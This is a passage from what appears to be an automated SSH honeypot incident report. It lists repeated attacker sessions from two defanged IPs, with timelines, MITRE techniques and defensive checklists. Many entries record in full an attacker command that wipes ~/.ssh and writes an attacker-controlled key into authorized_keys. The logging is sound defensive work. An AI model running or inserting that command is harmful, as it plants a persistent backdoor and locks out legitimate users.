| `2026-05-25 22:16:00` | `cowrie.session.file_download` |
| `2026-05-25 22:16:00` | `cowrie.log.closed` |
| `2026-05-25 22:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4da3b60b6b47

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:16 |
| **Last Seen** | 2026-05-25 22:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:16:02` | `cowrie.session.connect` |
| `2026-05-25 22:16:02` | `cowrie.client.version` |
| `2026-05-25 22:16:02` | `cowrie.client.kex` |
| `2026-05-25 22:16:03` | `cowrie.login.success` |
| `2026-05-25 22:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd791c18ca09

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:18 |
| **Last Seen** | 2026-05-25 22:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:18:18` | `cowrie.session.connect` |
| `2026-05-25 22:18:18` | `cowrie.client.version` |
| `2026-05-25 22:18:18` | `cowrie.client.kex` |
| `2026-05-25 22:18:19` | `cowrie.login.success` |
| `2026-05-25 22:18:19` | `cowrie.session.params` |
| `2026-05-25 22:18:19` | `cowrie.command.input` |
| `2026-05-25 22:18:19` | `cowrie.command.failed` |
| `2026-05-25 22:18:20` | `cowrie.log.closed` |
| `2026-05-25 22:18:20` | `cowrie.session.params` |
| `2026-05-25 22:18:20` | `cowrie.command.input` |
| `2026-05-25 22:18:20` | `cowrie.session.file_download` |
| `2026-05-25 22:18:20` | `cowrie.log.closed` |
| `2026-05-25 22:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-140ef95802c5

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:18 |
| **Last Seen** | 2026-05-25 22:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:18:22` | `cowrie.session.connect` |
| `2026-05-25 22:18:22` | `cowrie.client.version` |
| `2026-05-25 22:18:22` | `cowrie.client.kex` |
| `2026-05-25 22:18:23` | `cowrie.login.success` |
| `2026-05-25 22:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b954338d618f

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:19 |
| **Last Seen** | 2026-05-25 22:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:19:06` | `cowrie.session.connect` |
| `2026-05-25 22:19:06` | `cowrie.client.version` |
| `2026-05-25 22:19:06` | `cowrie.client.kex` |
| `2026-05-25 22:19:06` | `cowrie.login.success` |
| `2026-05-25 22:19:07` | `cowrie.session.params` |
| `2026-05-25 22:19:07` | `cowrie.command.input` |
| `2026-05-25 22:19:07` | `cowrie.command.failed` |
| `2026-05-25 22:19:07` | `cowrie.log.closed` |
| `2026-05-25 22:19:07` | `cowrie.session.params` |
| `2026-05-25 22:19:07` | `cowrie.command.input` |
| `2026-05-25 22:19:07` | `cowrie.session.file_download` |
| `2026-05-25 22:19:07` | `cowrie.log.closed` |
| `2026-05-25 22:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e135617a09ef

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:19 |
| **Last Seen** | 2026-05-25 22:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:19:09` | `cowrie.session.connect` |
| `2026-05-25 22:19:09` | `cowrie.client.version` |
| `2026-05-25 22:19:09` | `cowrie.client.kex` |
| `2026-05-25 22:19:10` | `cowrie.login.success` |
| `2026-05-25 22:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54910362a00b

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:19 |
| **Last Seen** | 2026-05-25 22:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:19:54` | `cowrie.session.connect` |
| `2026-05-25 22:19:54` | `cowrie.client.version` |
| `2026-05-25 22:19:54` | `cowrie.client.kex` |
| `2026-05-25 22:19:55` | `cowrie.login.success` |
| `2026-05-25 22:19:55` | `cowrie.session.params` |
| `2026-05-25 22:19:55` | `cowrie.command.input` |
| `2026-05-25 22:19:55` | `cowrie.command.failed` |
| `2026-05-25 22:19:55` | `cowrie.log.closed` |
| `2026-05-25 22:19:56` | `cowrie.session.params` |
| `2026-05-25 22:19:56` | `cowrie.command.input` |
| `2026-05-25 22:19:56` | `cowrie.session.file_download` |
| `2026-05-25 22:19:56` | `cowrie.log.closed` |
| `2026-05-25 22:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c53791f8e3f

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:19 |
| **Last Seen** | 2026-05-25 22:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:19:58` | `cowrie.session.connect` |
| `2026-05-25 22:19:58` | `cowrie.client.version` |
| `2026-05-25 22:19:58` | `cowrie.client.kex` |
| `2026-05-25 22:19:59` | `cowrie.login.success` |
| `2026-05-25 22:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f1b8a478f4

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:21 |
| **Last Seen** | 2026-05-25 22:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:21:37` | `cowrie.session.connect` |
| `2026-05-25 22:21:37` | `cowrie.client.version` |
| `2026-05-25 22:21:37` | `cowrie.client.kex` |
| `2026-05-25 22:21:37` | `cowrie.login.success` |
| `2026-05-25 22:21:38` | `cowrie.session.params` |
| `2026-05-25 22:21:38` | `cowrie.command.input` |
| `2026-05-25 22:21:38` | `cowrie.command.failed` |
| `2026-05-25 22:21:38` | `cowrie.log.closed` |
| `2026-05-25 22:21:38` | `cowrie.session.params` |
| `2026-05-25 22:21:38` | `cowrie.command.input` |
| `2026-05-25 22:21:38` | `cowrie.session.file_download` |
| `2026-05-25 22:21:38` | `cowrie.log.closed` |
| `2026-05-25 22:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-467f40bffe19

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:21 |
| **Last Seen** | 2026-05-25 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:21:41` | `cowrie.session.connect` |
| `2026-05-25 22:21:41` | `cowrie.client.version` |
| `2026-05-25 22:21:41` | `cowrie.client.kex` |
| `2026-05-25 22:21:42` | `cowrie.login.success` |
| `2026-05-25 22:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a978b232ffe5

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:22 |
| **Last Seen** | 2026-05-25 22:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:22:13` | `cowrie.session.connect` |
| `2026-05-25 22:22:13` | `cowrie.client.version` |
| `2026-05-25 22:22:13` | `cowrie.client.kex` |
| `2026-05-25 22:22:14` | `cowrie.login.success` |
| `2026-05-25 22:22:14` | `cowrie.session.params` |
| `2026-05-25 22:22:14` | `cowrie.command.input` |
| `2026-05-25 22:22:14` | `cowrie.command.failed` |
| `2026-05-25 22:22:14` | `cowrie.log.closed` |
| `2026-05-25 22:22:14` | `cowrie.session.params` |
| `2026-05-25 22:22:14` | `cowrie.command.input` |
| `2026-05-25 22:22:15` | `cowrie.session.file_download` |
| `2026-05-25 22:22:15` | `cowrie.log.closed` |
| `2026-05-25 22:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a734706ada

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:22 |
| **Last Seen** | 2026-05-25 22:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:22:17` | `cowrie.session.connect` |
| `2026-05-25 22:22:17` | `cowrie.client.version` |
| `2026-05-25 22:22:17` | `cowrie.client.kex` |
| `2026-05-25 22:22:17` | `cowrie.login.success` |
| `2026-05-25 22:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41949edb2047

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:22 |
| **Last Seen** | 2026-05-25 22:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:22:52` | `cowrie.session.connect` |
| `2026-05-25 22:22:52` | `cowrie.client.version` |
| `2026-05-25 22:22:52` | `cowrie.client.kex` |
| `2026-05-25 22:22:52` | `cowrie.login.success` |
| `2026-05-25 22:22:53` | `cowrie.session.params` |
| `2026-05-25 22:22:53` | `cowrie.command.input` |
| `2026-05-25 22:22:53` | `cowrie.command.failed` |
| `2026-05-25 22:22:53` | `cowrie.log.closed` |
| `2026-05-25 22:22:53` | `cowrie.session.params` |
| `2026-05-25 22:22:53` | `cowrie.command.input` |
| `2026-05-25 22:22:53` | `cowrie.session.file_download` |
| `2026-05-25 22:22:53` | `cowrie.log.closed` |
| `2026-05-25 22:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d3833f37c5

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:22 |
| **Last Seen** | 2026-05-25 22:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:22:56` | `cowrie.session.connect` |
| `2026-05-25 22:22:56` | `cowrie.client.version` |
| `2026-05-25 22:22:56` | `cowrie.client.kex` |
| `2026-05-25 22:22:56` | `cowrie.login.success` |
| `2026-05-25 22:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-462eb56676c2

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:24 |
| **Last Seen** | 2026-05-25 22:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:24:02` | `cowrie.session.connect` |
| `2026-05-25 22:24:02` | `cowrie.client.version` |
| `2026-05-25 22:24:02` | `cowrie.client.kex` |
| `2026-05-25 22:24:03` | `cowrie.login.success` |
| `2026-05-25 22:24:03` | `cowrie.session.params` |
| `2026-05-25 22:24:03` | `cowrie.command.input` |
| `2026-05-25 22:24:03` | `cowrie.command.failed` |
| `2026-05-25 22:24:03` | `cowrie.log.closed` |
| `2026-05-25 22:24:03` | `cowrie.session.params` |
| `2026-05-25 22:24:03` | `cowrie.command.input` |
| `2026-05-25 22:24:04` | `cowrie.session.file_download` |
| `2026-05-25 22:24:04` | `cowrie.log.closed` |
| `2026-05-25 22:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e50157ed5a

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-25 22:24 |
| **Last Seen** | 2026-05-25 22:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:24:05` | `cowrie.session.connect` |
| `2026-05-25 22:24:05` | `cowrie.client.version` |
| `2026-05-25 22:24:06` | `cowrie.client.kex` |
| `2026-05-25 22:24:06` | `cowrie.login.success` |
| `2026-05-25 22:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-757e118912d4

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:24 |
| **Last Seen** | 2026-05-25 22:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:24:28` | `cowrie.session.connect` |
| `2026-05-25 22:24:28` | `cowrie.client.version` |
| `2026-05-25 22:24:28` | `cowrie.client.kex` |
| `2026-05-25 22:24:29` | `cowrie.login.success` |
| `2026-05-25 22:24:29` | `cowrie.session.params` |
| `2026-05-25 22:24:29` | `cowrie.command.input` |
| `2026-05-25 22:24:29` | `cowrie.command.failed` |
| `2026-05-25 22:24:29` | `cowrie.log.closed` |
| `2026-05-25 22:24:30` | `cowrie.session.params` |
| `2026-05-25 22:24:30` | `cowrie.command.input` |
| `2026-05-25 22:24:30` | `cowrie.session.file_download` |
| `2026-05-25 22:24:30` | `cowrie.log.closed` |
| `2026-05-25 22:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e11c44c02141

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:24 |
| **Last Seen** | 2026-05-25 22:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 22:24:32` | `cowrie.session.connect` |
| `2026-05-25 22:24:32` | `cowrie.client.version` |
| `2026-05-25 22:24:32` | `cowrie.client.kex` |
| `2026-05-25 22:24:33` | `cowrie.login.success` |
| `2026-05-25 22:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.166.94[.]133` to AbuseIPDB if not already reported
- [ ] Block `183.166.94[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec88e00a56cb

| Field | Detail |
|---|---|
| **Source IP** | `183.166.94[.]133` |
| **First Seen** | 2026-05-25 22:25 |
| **Last Seen** | 2026-05-25 22:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
